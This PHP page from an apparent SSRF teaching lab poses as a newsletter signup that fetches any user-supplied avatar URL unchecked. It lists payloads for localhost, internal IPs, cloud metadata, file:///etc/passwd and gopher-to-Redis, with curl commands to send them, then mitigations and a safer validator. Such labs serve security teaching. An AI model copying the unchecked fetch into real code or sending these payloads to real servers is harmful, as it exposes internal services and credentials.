<?php
// SSRF Vulnerability Lab
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Newsletter Subscription - SSRF Lab</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>📧 Newsletter Subscription</h1>
            <h2>SSRF Vulnerability Lab</h2>
            
            <div class="warning">
                ⚠️ <strong>SSRF Vulnerability</strong><br>
                This page demonstrates Server-Side Request Forgery vulnerabilities.
            </div>

            <form action="newsletter.php" method="POST">
                <div class="form-group">
                    <label for="email">Your Email:</label>
                    <input type="text" id="email" name="email" placeholder="your@email.com" required>
                </div>

                <div class="form-group">
                    <label for="avatar_url">Profile Avatar URL (optional):</label>
                    <input type="text" id="avatar_url" name="avatar_url" placeholder="https://example.com/avatar.jpg">
                    <small>We'll fetch and validate your avatar image</small>
                </div>
                
                <button type="submit" class="btn">Subscribe</button>
            </form>

            <div style="margin-top: 20px;">
                <a href="index.php" class="btn btn-secondary">← Back to Login</a>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $email = $_POST['email'] ?? '';
                $avatar_url = $_POST['avatar_url'] ?? '';
                
                echo '<div class="response-section">';
                echo '<h3>📬 Processing Subscription...</h3>';
                
                echo '<div class="info-box">';
                echo '<p><strong>Email:</strong> ' . htmlspecialchars($email) . '</p>';
                
                if (!empty($avatar_url)) {
                    echo '<p><strong>Avatar URL:</strong> ' . htmlspecialchars($avatar_url) . '</p>';
                    
                    // VULNERABILITY: SSRF - Fetching user-provided URL without validation
                    echo '<div class="command-display">';
                    echo '<strong>Fetching Avatar...</strong><br>';
                    echo '<code>Making request to: ' . htmlspecialchars($avatar_url) . '</code>';
                    echo '</div>';
                    
                    try {
                        // VULNERABLE: No URL validation, allows internal network access
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $avatar_url);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                        curl_setopt($ch, CURLOPT_HEADER, true);
                        
                        $response = curl_exec($ch);
                        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                        $error = curl_error($ch);
                        curl_close($ch);
                        
                        echo '<div class="output-display">';
                        echo '<strong>Server Response:</strong><br>';
                        
                        if ($error) {
                            echo '<pre>Error: ' . htmlspecialchars($error) . '</pre>';
                        } else {
                            echo '<p><strong>HTTP Status Code:</strong> ' . $http_code . '</p>';
                            
                            // Show first 1000 characters of response
                            $preview = substr($response, 0, 1000);
                            echo '<pre>' . htmlspecialchars($preview) . '</pre>';
                            
                            if (strlen($response) > 1000) {
                                echo '<p><em>... (response truncated)</em></p>';
                            }
                        }
                        echo '</div>';
                        
                    } catch (Exception $e) {
                        echo '<div class="error">Error fetching avatar: ' . htmlspecialchars($e->getMessage()) . '</div>';
                    }
                }
                echo '</div>';
                
                echo '<div class="success-box" style="margin-top: 15px;">';
                echo '✅ Subscription processed successfully!';
                echo '</div>';
                
                echo '</div>';
            }
            ?>

            <div class="hints">
                <h3>🎯 SSRF Exploitation</h3>
                <details open>
                    <summary>💡 How to Exploit</summary>
                    <div class="exploit-examples">
                        <p><strong>The vulnerability:</strong> The server fetches user-provided URLs without validation, allowing access to internal resources.</p>
                        
                        <h4>Basic SSRF Payloads:</h4>
                        <div class="code-block">
# Access localhost
http://localhost/
http://127.0.0.1/

# Access internal services
http://localhost:80/admin.php
http://127.0.0.1:8080/

# Access metadata services (cloud environments)
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/

# Access internal network
http://172.25.0.1/
http://172.25.0.10/api.php?action=info

# File protocol (if enabled)
file:///etc/passwd
file:///var/www/html/db.php
                        </div>

                        <h4>Advanced Techniques:</h4>
                        <div class="code-block">
# Port scanning internal network
http://172.25.0.10:22/
http://172.25.0.10:3306/
http://172.25.0.10:6379/

# Access other containers in hexnet
http://172.25.0.2/
http://172.25.0.3/

# DNS rebinding
http://attacker-controlled-domain.com/

# Using different protocols
gopher://localhost:6379/_INFO
dict://localhost:11211/stats
                        </div>

                        <h4>Testing with curl:</h4>
                        <div class="code-block">
# Basic SSRF test
curl -X POST http://localhost:8080/newsletter.php \
  -d "email=test@test.com" \
  -d "avatar_url=http://localhost/"

# Access internal API
curl -X POST http://localhost:8080/newsletter.php \
  -d "email=test@test.com" \
  -d "avatar_url=http://172.25.0.10/api.php?action=info"

# Try to read local files (may not work depending on curl config)
curl -X POST http://localhost:8080/newsletter.php \
  -d "email=test@test.com" \
  -d "avatar_url=file:///etc/passwd"
                        </div>

                        <h4>Real-World Impact:</h4>
                        <ul>
                            <li>Access internal services not exposed to internet</li>
                            <li>Port scanning internal network</li>
                            <li>Read cloud metadata (AWS, GCP, Azure credentials)</li>
                            <li>Bypass firewall restrictions</li>
                            <li>Access localhost services (Redis, MySQL, etc.)</li>
                            <li>Perform attacks on internal systems</li>
                        </ul>
                    </div>
                </details>

                <details>
                    <summary>🛡️ How to Prevent</summary>
                    <div class="exploit-examples">
                        <ul>
                            <li>Implement URL whitelist for allowed domains</li>
                            <li>Block access to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8)</li>
                            <li>Block access to localhost and metadata endpoints</li>
                            <li>Use DNS resolution to check IP before making request</li>
                            <li>Disable unnecessary protocols (file://, gopher://, dict://)</li>
                            <li>Implement network segmentation</li>
                            <li>Use a proxy service for external requests</li>
                        </ul>
                        <div class="code-block">
// SECURE Example:
function isUrlSafe($url) {
    $parsed = parse_url($url);
    
    // Only allow HTTP/HTTPS
    if (!in_array($parsed['scheme'], ['http', 'https'])) {
        return false;
    }
    
    // Resolve hostname to IP
    $ip = gethostbyname($parsed['host']);
    
    // Block private IPs
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return false;
    }
    
    // Whitelist allowed domains
    $allowed_domains = ['example.com', 'trusted-cdn.com'];
    if (!in_array($parsed['host'], $allowed_domains)) {
        return false;
    }
    
    return true;
}
                        </div>
                    </div>
                </details>

                <details>
                    <summary>🔍 Quick Test Examples</summary>
                    <div class="exploit-examples">
                        <h4>Try these URLs in the form:</h4>
                        <ol>
                            <li><code>http://localhost/</code> - Access the web server itself</li>
                            <li><code>http://127.0.0.1/admin.php</code> - Try to access admin page</li>
                            <li><code>http://172.25.0.10/api.php?action=info</code> - Access JWT API</li>
                            <li><code>http://172.25.0.1/</code> - Access gateway</li>
                            <li><code>http://169.254.169.254/</code> - Try cloud metadata (won't work locally)</li>
                        </ol>
                    </div>
                </details>
            </div>
        </div>
    </div>

    <style>
        .additional-links {
            margin-top: 15px;
            text-align: center;
            padding: 15px 0;
            border-top: 1px solid #ddd;
            border-bottom: 1px solid #ddd;
        }
        
        .additional-links a {
            display: inline-block;
            margin: 5px 10px;
            color: #667eea;
            text-decoration: none;
            font-weight: 500;
        }
        
        .additional-links a:hover {
            text-decoration: underline;
        }
        
        .response-section {
            margin-top: 20px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 5px;
            border-left: 4px solid #667eea;
        }
        
        .info-box {
            background: #e7f3ff;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #2196F3;
        }
        
        .command-display {
            background: #fff3cd;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #ffc107;
        }
        
        .command-display code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 10px;
            display: block;
            border-radius: 3px;
            margin-top: 5px;
            font-family: 'Courier New', monospace;
        }
        
        .output-display {
            background: #d4edda;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #28a745;
        }
        
        .output-display pre {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 10px;
            border-radius: 3px;
            margin-top: 5px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            max-height: 400px;
        }
        
        .code-block {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        
        .exploit-examples {
            background: #fff;
            padding: 15px;
            border-radius: 5px;
            margin-top: 10px;
        }
        
        .exploit-examples h4 {
            color: #667eea;
            margin-top: 15px;
            margin-bottom: 10px;
        }
        
        .exploit-examples ul {
            margin-left: 20px;
        }
        
        .exploit-examples li {
            margin-bottom: 8px;
        }
        
        .exploit-examples ol {
            margin-left: 20px;
        }
        
        .exploit-examples ol li {
            margin-bottom: 10px;
        }
        
        small {
            display: block;
            margin-top: 5px;
            color: #666;
            font-style: italic;
        }
    </style>
</body>
</html>